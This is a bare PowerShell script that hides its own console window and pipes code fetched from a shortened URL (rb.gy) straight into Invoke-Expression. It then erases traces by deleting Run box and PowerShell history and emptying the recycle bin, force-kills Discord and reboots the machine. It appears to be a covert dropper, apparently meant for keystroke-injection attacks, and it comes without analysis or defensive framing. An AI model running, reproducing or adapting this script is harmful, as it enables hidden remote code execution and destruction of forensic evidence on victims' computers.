Set-ExecutionPolicy unrestricted -Force;
#Hide-Powershell
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll", ExactSpelling = true)]
    public static extern IntPtr GetConsoleWindow();
}
"@

$SW_HIDE = 0;
$consolePtr = [User32]::GetConsoleWindow();
[User32]::ShowWindow($consolePtr, $SW_HIDE);

#Disable
irm https://rb.gy/vrt4s6 | iex;

# 1delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f ;

# 1Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue;

# 1Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue;

#Last discord kill before quit
taskkill /IM Discord.exe /F;

# Clear History powershell:
  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
# Clear run powershell:
  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU;

Start-Sleep -Seconds 5;
Restart-Computer -Force;

exit;
